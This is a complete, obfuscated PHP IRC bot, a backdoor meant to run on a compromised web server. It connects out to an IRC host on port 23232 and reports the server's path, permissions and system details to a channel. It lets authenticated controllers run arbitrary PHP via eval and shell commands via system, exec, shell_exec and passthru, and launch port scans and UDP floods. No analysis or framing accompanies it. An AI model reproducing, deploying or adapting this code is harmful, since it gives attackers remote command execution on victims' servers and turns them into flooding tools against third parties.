<?php set_time_limit(0); error_reporting(0);  class jFFbNJFZffbRJZNJn {

 var $ZFZNFvBZVbZfZZR = array("bBVnJzNRFRfnNVvB"=>"gang.sexpil.net",
                     "RzZb"=>"23232",
                     "FrbBN"=>"scary",
                     "fZVbvj"=>"13",
                     "dtDlP"=>"#wWw#",
                     "rjb"=>"scan",
                     "jNRfnVzRV"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "NZrFznRFjV"=>".",
                     "zrvfnbBRZjN"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $BvvnJnNNRZJRzZBZfr = array(); 
 function yAqaYmimeYiEu() 
 { 
    if(!($this->wGWsgCKSS = fsockopen($this->ZFZNFvBZVbZfZZR['bBVnJzNRFRfnNVvB'],$this->ZFZNFvBZVbZfZZR['RzZb'],$e,$s,30))) 
    $this->yAqaYmimeYiEu(); 
    $this->uAuIymmyYmYqaaQAU();
    if(strlen($this->ZFZNFvBZVbZfZZR['FrbBN'])>0) 
    $this->QaUYEee("PASS ".$this->ZFZNFvBZVbZfZZR['FrbBN']);
    $this->yQMMmMEqiqaYYAIa();
    $this->UUMyqeyiyyUmEy();
 } function AUYyqMYImyyQqyaAMuA() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $xpTdptXhLpt = "\0034ON\003"; } else { $xpTdptXhLpt = "\0039OFF\003"; }

	$lhLXLtlP = php_uname();
	if($lhLXLtlP == "") { $BjCkdd = "\00315---\003"; } else { $BjCkdd = "\00315".$lhLXLtlP."\003"; }
		 
	 $RvoO = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $pDwsW =  getcwd()."";
	 
	 $HgOW = "\00315".$pDwsW."\003";

	$CGogSowocs = fileperms("$pDwsW");

	if (($CGogSowocs & 0xC000) == 0xC000) { $sCOcWCWswgK = 's';
	} elseif (($CGogSowocs & 0xA000) == 0xA000) { $sCOcWCWswgK = 'l';
	} elseif (($CGogSowocs & 0x8000) == 0x8000) { $sCOcWCWswgK = '-';
	} elseif (($CGogSowocs & 0x6000) == 0x6000) { $sCOcWCWswgK = 'b';
	} elseif (($CGogSowocs & 0x4000) == 0x4000) { $sCOcWCWswgK = 'd';
	} elseif (($CGogSowocs & 0x2000) == 0x2000) { $sCOcWCWswgK = 'c';
	} elseif (($CGogSowocs & 0x1000) == 0x1000) { $sCOcWCWswgK = 'p';
	} else { $sCOcWCWswgK = 'u'; }

	$sCOcWCWswgK .= (($CGogSowocs & 0x0100) ? 'r' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0080) ? 'w' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0040) ?	(($CGogSowocs & 0x0800) ? 's' : 'x' ) :	(($CGogSowocs & 0x0800) ? 'S' : '-'));

	$sCOcWCWswgK .= (($CGogSowocs & 0x0020) ? 'r' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0010) ? 'w' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0008) ?	(($CGogSowocs & 0x0400) ? 's' : 'x' ) :	(($CGogSowocs & 0x0400) ? 'S' : '-'));

	$sCOcWCWswgK .= (($CGogSowocs & 0x0004) ? 'r' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0002) ? 'w' : '-');
	$sCOcWCWswgK .= (($CGogSowocs & 0x0001) ?	(($CGogSowocs & 0x0200) ? 't' : 'x' ) :	(($CGogSowocs & 0x0200) ? 'T' : '-'));
			
	$JNPD = "\00315".$sCOcWCWswgK."\003";

	$this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"\00314[SAFE:\003\002 $xpTdptXhLpt\002\00314]\00315 $RvoO \00314[pwd:]\00315 $HgOW \00314(\003$JNPD\00314) [uname:]\00315 $BjCkdd");
 } function eIEaqI($dtDlP,$rjb=NULL) 
 { 
    $this->QaUYEee("JOIN $dtDlP $rjb"); 
 } function qMYyyImqeyU($DL,$dPL)
 {
    $this->QaUYEee("PRIVMSG $DL :$dPL");
 } function AmImqAYiaUIaAiyaeI($pdpl,$tlTThLtDHp,$MiEu) {
	$this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002UdpFlood Gestart!\002]"); 
	$LxTHxdTTP = "";
	for($T=0;$T<$tlTThLtDHp;$T++) { $LxTHxdTTP .= chr(mt_rand(1,256)); }
	$HPpTD = time();
	$T = 0;
	while(time()-$HPpTD < $MiEu) {
		$Fh=fsockopen("udp://".$pdpl,mt_rand(0,6000),$e,$s,5);
      	fwrite($Fh,$LxTHxdTTP);
       	fclose($Fh);
		$T++;
	}
	$fOL = $T * $tlTThLtDHp;
	$fOL = $fOL / 1048576;
	$TRO = $fOL / $MiEu;
	$TRO = round($TRO);
	$fOL = round($fOL);
	$this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002UdpFlood Afgerond!\002]: $fOL MB verzonden / gemiddelde: $TRO MB/s ");
 } function yQMMmMEqiqaYYAIa() {
  $tHXXTD = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $TtXltHX = strlen($tHXXTD);
  for($T=0;$T<$this->ZFZNFvBZVbZfZZR['fZVbvj'];$T++) {
	$myu .= $tHXXTD[rand(0,$TtXltHX-1)];
  }
  $this->QaUYEee("NICK ".$myu."");
 }function UUMyqeyiyyUmEy() 
 { 
    while(!feof($this->wGWsgCKSS)) 
    { 
       $this->iAAYQ = trim(fgets($this->wGWsgCKSS,512)); 
       $nVZbBNvBbRNzJ = explode(" ",$this->iAAYQ); 
       if(substr($this->iAAYQ,0,6)=="PING :") 
       { 
          $this->QaUYEee("PONG :".substr($this->iAAYQ,6)); 
       } 
       if(isset($nVZbBNvBbRNzJ[1]) && $nVZbBNvBbRNzJ[1] =="004") 
       { 
          $this->QaUYEee("JOIN ".$this->ZFZNFvBZVbZfZZR['dtDlP']." ".$this->ZFZNFvBZVbZfZZR['rjb']."");
          $this->eIEaqI($this->ZFZNFvBZVbZfZZR['dtDlP'],$this->ZFZNFvBZVbZfZZR['rjb']);
          $this->AUYyqMYImyyQqyaAMuA();
       } 
       if(isset($nVZbBNvBbRNzJ[1]) && $nVZbBNvBbRNzJ[1]=="433") 
       { 
          $this->yQMMmMEqiqaYYAIa(); 
       }
       if($this->iAAYQ != $Rfv_lPH) 
       { 
          $RzvFbfZbZVJNZj = array(); 
          $WCW = substr(strstr($this->iAAYQ," :"),2); 
          $wgsC = explode(" ",$WCW); 
          $GOKSk = explode("!",$nVZbBNvBbRNzJ[0]); 
          $sSGOgO = explode("@",$GOKSk[1]); 
          $sSGOgO = $sSGOgO[1]; 
          $GOKSk = substr($GOKSk[0],1); 
          $cSwSOgK = $nVZbBNvBbRNzJ[0]; 
          if($wgsC[0]==$this->GOKSk) 
          { 
           for($T=0;$T<count($wgsC);$T++) 
              $RzvFbfZbZVJNZj[$T] = $wgsC[$T+1]; 
          } 
          else 
          { 
           for($T=0;$T<count($wgsC);$T++) 
              $RzvFbfZbZVJNZj[$T] = $wgsC[$T]; 
          } 
          if(count($nVZbBNvBbRNzJ)>2) 
          { 
             switch($nVZbBNvBbRNzJ[1]) 
             { 
                case "QUIT": 
                   if($this->AqUyimeEiMmm($cSwSOgK)) 
                   { 
                      $this->miQqYiau($cSwSOgK); 
                   } 
                break; 
                case "PART": 
                   if($this->AqUyimeEiMmm($cSwSOgK)) 
                   { 
                      $this->miQqYiau($cSwSOgK); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->AqUyimeEiMmm($cSwSOgK) && (md5($sSGOgO) == $this->ZFZNFvBZVbZfZZR['zrvfnbBRZjN'] || $this->ZFZNFvBZVbZfZZR['zrvfnbBRZjN'] == "*")) 
                   { 
                      if(substr($RzvFbfZbZVJNZj[0],0,1)==$this->ZFZNFvBZVbZfZZR['NZrFznRFjV']) 
                      { 
                         switch(substr($RzvFbfZbZVJNZj[0],1)) 
                         { 
                            case "user": 
                              if(md5($RzvFbfZbZVJNZj[1])==$this->ZFZNFvBZVbZfZZR['jNRfnVzRV']) 
                              { 
                                 $this->UAYquIUuE($cSwSOgK);
                              } 
                              else 
                              { 
                                 $this->IammEEuueQ($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002Auth\002]: Fout password $GOKSk idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->AqUyimeEiMmm($cSwSOgK)) 
                   { 
                      if(substr($RzvFbfZbZVJNZj[0],0,1)==$this->ZFZNFvBZVbZfZZR['NZrFznRFjV']) 
                      { 
                         switch(substr($RzvFbfZbZVJNZj[0],1)) 
                         {                            case "pscan": 
                               if(count($RzvFbfZbZVJNZj) > 2) 
                               { 
                                  if(fsockopen($RzvFbfZbZVJNZj[1],$RzvFbfZbZVJNZj[2],$e,$s,15)) 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002pscan\002]: ".$RzvFbfZbZVJNZj[1].":".$RzvFbfZbZVJNZj[2]." is \2open\2"); 
                                  else 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002pscan\002]: ".$RzvFbfZbZVJNZj[1].":".$RzvFbfZbZVJNZj[2]." is \2closed\2"); 
                               } 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($WCW,$RzvFbfZbZVJNZj[1]),strlen($RzvFbfZbZVJNZj[1])));
                            break;                            case "system": 
                               $skkCCSOGKOww = substr(strstr($WCW,$RzvFbfZbZVJNZj[0]),strlen($RzvFbfZbZVJNZj[0])+1); 
                               $sgkCSWkscwsKs = system($skkCCSOGKOww); 
                               $OSWWKoSWcSwWgc = explode("\n",$sgkCSWkscwsKs); 
                               for($T=0;$T<count($OSWWKoSWcSwWgc);$T++) 
                                  if($OSWWKoSWcSwWgc[$T]!=NULL) 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"      : ".trim($OSWWKoSWcSwWgc[$T])); 
                            break;                            case "raw":
                               $this->QaUYEee(strstr($WCW,$RzvFbfZbZVJNZj[1])); 
                            break;                            case "rndnick": 
                               $this->yQMMmMEqiqaYYAIa(); 
                            break;                            case "logout": 
                               $this->miQqYiau($cSwSOgK); 
                               $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002Auth\002]\00314 Je bent nu uitgelogt $GOKSk"); 
                            break;                            case "sexec":
                               $skkCCSOGKOww = substr(strstr($WCW,$RzvFbfZbZVJNZj[0]),strlen($RzvFbfZbZVJNZj[0])+1); 
                               $sgkCSWkscwsKs = shell_exec($skkCCSOGKOww); 
                               $OSWWKoSWcSwWgc = explode("\n",$sgkCSWkscwsKs); 
                               for($T=0;$T<count($OSWWKoSWcSwWgc);$T++) 
                                  if($OSWWKoSWcSwWgc[$T]!=NULL) 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"      : ".trim($OSWWKoSWcSwWgc[$T])); 
                            break;                            case "dns": 
                               if(isset($RzvFbfZbZVJNZj[1])) 
                               { 
                                  $Gs = explode(".",$RzvFbfZbZVJNZj[1]); 
                                  if(count($Gs)==4 && is_numeric($Gs[0]) && is_numeric($Gs[1]) && is_numeric($Gs[2]) && is_numeric($Gs[3])) 
                                  { 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002dns\002]: ".$RzvFbfZbZVJNZj[1]." => ".gethostbyaddr($RzvFbfZbZVJNZj[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"[\002dns\002]: ".$RzvFbfZbZVJNZj[1]." => ".gethostbyname($RzvFbfZbZVJNZj[1])); 
                                  } 
                               } 
                            break;                            case "exec": 
                               $skkCCSOGKOww = substr(strstr($WCW,$RzvFbfZbZVJNZj[0]),strlen($RzvFbfZbZVJNZj[0])+1); 
                               $sgkCSWkscwsKs = exec($skkCCSOGKOww); 
                               $OSWWKoSWcSwWgc = explode("\n",$sgkCSWkscwsKs); 
                               for($T=0;$T<count($OSWWKoSWcSwWgc);$T++) 
                                  if($OSWWKoSWcSwWgc[$T]!=NULL) 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"      : ".trim($OSWWKoSWcSwWgc[$T])); 
                            break;                            case "passthru": 
                               $skkCCSOGKOww = substr(strstr($WCW,$RzvFbfZbZVJNZj[0]),strlen($RzvFbfZbZVJNZj[0])+1); 

                               $sgkCSWkscwsKs = passthru($skkCCSOGKOww); 
                               $OSWWKoSWcSwWgc = explode("\n",$sgkCSWkscwsKs); 
                               for($T=0;$T<count($OSWWKoSWcSwWgc);$T++) 
                                  if($OSWWKoSWcSwWgc[$T]!=NULL) 
                                     $this->qMYyyImqeyU($this->ZFZNFvBZVbZfZZR['dtDlP'],"      : ".trim($OSWWKoSWcSwWgc[$T])); 
                            break;                            case "udpflood": 
                               if(count($RzvFbfZbZVJNZj)>3) 
                               { 
                                  $this->AmImqAYiaUIaAiyaeI($RzvFbfZbZVJNZj[1],$RzvFbfZbZVJNZj[2],$RzvFbfZbZVJNZj[3]); 
                               } 
                            break;                            case "restart": 
                               $this->QaUYEee("QUIT :gerestart door $GOKSk");
                               fclose($this->wGWsgCKSS); 
                               $this->yAqaYmimeYiEu(); 
                            break;                            case "die": 
                               $this->QaUYEee("QUIT :die command from $GOKSk");
                               fclose($this->wGWsgCKSS); 
                               exit;                            case "info":
                               $this->AUYyqMYImyyQqyaAMuA();
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $Rfv_lPH = $this->iAAYQ; 
    } 
    $this->yAqaYmimeYiEu(); 
 } function uAuIymmyYmYqaaQAU() {
  $tHXXTD = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $TtXltHX = strlen($tHXXTD);
  for($T=0;$T<6;$T++) {
	$myu .= $tHXXTD[rand(0,$TtXltHX-1)];
  }
  if(php_uname() == "") { $lhLXLtlP = "---"; } else { $lhLXLtlP = php_uname(); }
  $this->QaUYEee("USER ".$myu."-go 127.0.0.1 localhost :".$lhLXLtlP."");
 } function QaUYEee($dPL) 
 { 
    fwrite($this->wGWsgCKSS,"$dPL\r\n"); 
 } function UAYquIUuE($pdpl) 
 { 
    $this->BvvnJnNNRZJRzZBZfr[$pdpl] = true; 
 } function miQqYiau($pdpl) 
 { 
    unset($this->BvvnJnNNRZJRzZBZfr[$pdpl]); 
 } function IammEEuueQ($DL,$dPL)
 {
    $this->QaUYEee("NOTICE $DL :$dPL");
 } function AqUyimeEiMmm($pdpl) 
 { 
    if(isset($this->BvvnJnNNRZJRzZBZfr[$pdpl])) 
       return 1; 
    else 
       return 0; 
 }}
$OGKkkcgO = new jFFbNJFZffbRJZNJn;
$OGKkkcgO->yAqaYmimeYiEu(); ?>